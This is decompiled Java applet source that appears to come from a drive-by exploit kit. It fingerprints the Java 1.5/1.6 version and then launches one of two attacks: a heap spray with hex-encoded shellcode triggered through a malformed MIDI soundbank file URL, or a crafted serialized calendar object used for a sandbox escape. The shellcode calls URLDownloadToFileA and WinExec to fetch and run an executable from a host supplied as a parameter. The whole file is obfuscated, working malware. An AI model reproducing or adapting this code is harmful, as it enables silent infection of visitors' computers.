// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

public class Dyteiorp extends Applet
{
    private IntBuffer[] mem;
    String ThysOze;
    String VukywakarnaTezod;
    String WawAtuuwca;
    private static final long serialVersionUID = -3238297386635759160L;
    String VanevuseRyzopadijav;
    String[] sarr;
    String GylynIfumyqipexipy;
    String PazIgum;
    int ByjusukpefuQalyhel;
    int uzixisagnygelapi;
    int ViriSakipyjy;
    private final String serializedObject;
    public static String data;
    
    public Dyteiorp() {
        this.sarr = new String[] { "ACED00057372001B6A6176612E7574696C2E477265676F7269616E43616C656E6461728F3DD7D6E5B0D0C10200014A0010677265676F7269616E4375746F766572787200126A6176612E7574696C2E43616C656E646172E6EA4D1", "EC8DC5B8E03000B5A000C6172654669656C647353657449000E66697273744461794F665765656B5A0009697354696D655365745A00076C656E69656E744900166D696E696D616C44617973496E46697273745765656B4900096E6578745374616D7049001573657269616C56657273696F6E4F6E53747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047", "A6F6E657400144C6A6176612F7574696C2F54696D655A6F6E653B78700100000001010100000001000000020000000100000121563AFC0E757200025B494DBA602676EAB2A502000078700000001100000001000007D9000000040000001500000004000000120000008A00000002000000030000000100000004000000100000001100000022000002DEFE488C0000000000757200025B5A578F203914B85DE20200007870000", "000110101010101010101010101010101010101737200186A6176612E7574696C2E53696D706C6554696D655A6F6E65FA675D60D15EF5A603001249000A647374536176696E6773490006656E6444617949000C656E644461794F665765656B490007656E644D6F6465490008656E644D6F6E7468490007656E6454696D6549000B656E6454696D654D6F64654900097261774F666673657449001573657269616C56657273696", "F6E4F6E53747265616D490008737461727444617949000E73746172744461794F665765656B49000973746172744D6F646549000A73746172744D6F6E7468490009737461727454696D6549000D737461727454696D654D6F64654900097374617274596561725A000B7573654461796C696768745B000B6D6F6E74684C656E6774687400025B42787200126A6176612E7574696C2E54696D655A6F6E6531B3E9F57744ACA1020", "0014C000249447400124C6A6176612F6C616E672F537472696E673B787074000E416D65726963612F446177736F6E0036EE80000000000000000000000000000000000000000000000000FE488C00000000020000000000000000000000000000000000000000000000000000000000757200025B42ACF317F8060854E002000078700000000C1F1C1F1E1F1E1F1F1E1F1E1F770A000000060000000000007571007E000600000", "0020000000000000000787372000D6465762E732E50696E67506F6E5E8B4C67DDC409D8020000787078FFFFF4E2F964AC000A" };
        this.serializedObject = this.sarr[0] + this.sarr[1] + this.sarr[2] + this.sarr[3] + this.sarr[4] + this.sarr[5] + this.sarr[6];
    }
    
    public void init() {
        final String[] array = { "505351525657559CE8000000005D83ED0D31C064034030780C8B400C8B701CAD8B4008EB098B40348D407C8B403C5657BE5E01000001EEBF4E01000001EFE8D60100005F5E89EA81C25E010000526880000000FF954E01000089EA81C25E01000031F601C28A9C356302000080FB007406881C3246EBEEC604320089EA81C24502000052FF955201000089EA81C2500200", "005250FF95560100006A006A0089EA81C25E0100005289EA81C278020000526A00FFD06A0589EA81C25E01000052FF955A01000089EA81C25E010000526880000000FF954E01000089EA81C25E01000031F601C28A9C356E02000080FB007406881C3246EBEEC604320089EA81C24502000052FF955201000089EA81C2500200005250FF95560100006A006A0089EA81C2", "5E0100005289EA81C2A6020000526A00FFD06A0589EA81C25E01000052FF955A0100009D5D5F5E5A595B58C30000000000000000000000000000000047657454656D705061746841004C6F61644C696272617279410047657450726F63416464726573730057696E4578656300BB89F289F730C0AE75FD29F789F931C0BE3C00000003B51B02000066AD03851B0200008B", "707883C61C03B51B0200008DBD1F020000AD03851B020000ABAD03851B02000050ABAD03851B020000AB5E31DBAD5603851B02000089C689D751FCF3A65974045E43EBE95E93D1E003852702000031F69666ADC1E00203851F02000089C6AD03851B020000C3EB100000000000000000000000000000000089851B0200005657E858FFFFFF5F5EAB01CE803EBB7402EBED", "C355524C4D4F4E2E444C4C0055524C446F776E6C6F6164546F46696C6541007064667570642E6578650063726173682E70687000" };
        final String string = array[0] + array[1] + array[2] + array[3] + array[4];
        final String[] array2 = { "da", "ta", "c" };
        final String property = System.getProperty("java.version");
        final String parameter = this.getParameter(array2[0] + array2[1]);
        final char[] array3 = { '?' };
        int n = 0;
        char c = '\0';
        while (parameter.charAt(n) != array3[0]) {
            c += parameter.charAt(n);
            ++n;
        }
        c += '\u0007';
        if (parameter.indexOf("deserialize=" + Integer.toHexString(c % '\u0100')) == -1) {
            return;
        }
        if ((property.indexOf("1.6.0_11") != -1 || property.indexOf("1.6.0_12") != -1 || property.indexOf("1.6.0_13") != -1 || property.indexOf("1.6.0_14") != -1 || property.indexOf("1.6.0_15") != -1 || property.indexOf("1.6.0_16") != -1) & parameter.indexOf("i=1") == -1) {
            repeat('/', 303);
            if (System.getProperty("os.name").toLowerCase().indexOf("win") < 0) {
                return;
            }
            final String string2 = "file://" + repeat('/', 302) + "Z%Z%Z%Z%Z%Z%";
            try {
                final String string3 = this.getParameter(array2[0] + array2[1]) + "11";
                String s = "";
                for (int i = 0; i < string3.length(); ++i) {
                    s += Integer.toHexString(string3.charAt(i));
                }
                while (s.length() % 8 != 0) {
                    s += "26";
                }
                this.mem = this.spray(string + s, "90909090");
                MidiSystem.getSoundbank(new URL(string2));
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex) {
                System.out.println(ex);
            }
        }
        if (property == "1.5.0" || property.indexOf("1.5.0_01") != -1 || property.indexOf("1.5.0_02") != -1 || property.indexOf("1.5.0_03") != -1 || property.indexOf("1.5.0_04") != -1 || property.indexOf("1.5.0_05") != -1 || property.indexOf("1.5.0_06") != -1 || property.indexOf("1.5.0_07") != -1 || property.indexOf("1.5.0_08") != -1 || property.indexOf("1.5.0_09") != -1 || property.indexOf("1.5.0_10") != -1 || property.indexOf("1.5.0_11") != -1 || property.indexOf("1.5.0_12") != -1 || property.indexOf("1.5.0_13") != -1 || property.indexOf("1.5.0_14") != -1 || property.indexOf("1.5.0_15") != -1 || property.indexOf("1.5.0_16") != -1 || property == "1.6.0" || property == "1.6.0_01" || property.indexOf("1.6.0_02") != -1 || property.indexOf("1.6.0_03") != -1 || property.indexOf("1.6.0_04") != -1 || property.indexOf("1.6.0_05") != -1 || property.indexOf("1.6.0_06") != -1 || property.indexOf("1.6.0_07") != -1 || property.indexOf("1.6.0_10") != -1) {
            try {
                final Object object = new ObjectInputStream(new ByteArrayInputStream(Nuytqwecuem.StringToBytes(this.serializedObject))).readObject();
                final String parameter2 = this.getParameter(array2[2] + array2[2]);
                String parameter3 = this.getParameter(array2[0] + array2[1]);
                if (object != null && PingPon.instance != null) {
                    if (parameter3 == null) {
                        parameter3 = "";
                    }
                    PingPon.instance.gogogo(parameter3, parameter2);
                }
            }
            catch (Exception ex3) {}
        }
        if (property.indexOf("1.5.0_17") != -1 || property.indexOf("1.5.0_18") != -1 || property.indexOf("1.5.0_19") != -1 || property.indexOf("1.5.0_20") != -1 || property.indexOf("1.5.0_21") != -1 || parameter.indexOf("i=1") != -1) {
            repeat('/', 303);
            if (System.getProperty("os.name").toLowerCase().indexOf("win") < 0) {
                return;
            }
            final String string4 = "file://" + repeat('/', 304) + "$\"$\"$\"$\"$\"$\"";
            try {
                final String string5 = this.getParameter(array2[0] + array2[1]) + "11";
                String s2 = "";
                for (int j = 0; j < string5.length(); ++j) {
                    s2 += Integer.toHexString(string5.charAt(j));
                }
                while (s2.length() % 8 != 0) {
                    s2 += "26";
                }
                this.mem = this.spray(string + s2, "90909090");
                MidiSystem.getSoundbank(new URL(string4));
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex2) {
                System.out.println(ex2);
            }
        }
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] spray(final String s, final String s2) {
        return this.spray(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
    
    static {
        Dyteiorp.data = null;
    }
}
